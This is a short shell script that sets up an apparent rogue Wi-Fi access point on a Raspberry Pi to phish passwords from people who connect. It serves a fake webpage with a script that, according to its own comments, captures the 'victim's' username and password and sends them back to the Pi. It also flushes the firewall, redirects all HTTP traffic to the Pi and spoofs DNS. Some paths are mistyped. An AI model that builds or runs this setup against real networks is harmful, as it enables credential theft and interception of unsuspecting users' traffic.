#!/bin/sh

#copy the webpage to the apache's directory and this will show the victiom once they connect to the server
cp index.html /var/www/html/index.html
#the js script for capturing the password and username and send it back to the raspberry Pi
cp aj3.js /var/www/html/

#lanuch the apache webserver
/ect/init.d/apache2 start
#setup the Access Point and set its gateway 
ifconfig at0 10.0.0.1 up
#setup the netmask
ifconfig at0 10.0.0.1 netmask 255.255.255.0
#Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#copy the conf file to the dhcp directory
cp ./conf/dhcpd.conf /etc/dhcp/

#Start dhcpd Listener
#Here -C stands for Configuration file and -d stands for daemon mode
dnsmasq -C ./conf/dnsmasq.conf -d

#killall dnsmasq dhcpd isc-dhcp-server
/etc/init.d/dnsmasq start

#this is for setting the firewall rules by using iptables

#clean all the rules firstly 
iptables --flush
#add the rules in net address translate table 
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

#redirect all HTTP traffic coming from the at0 interface.
dnsspoof -i at0
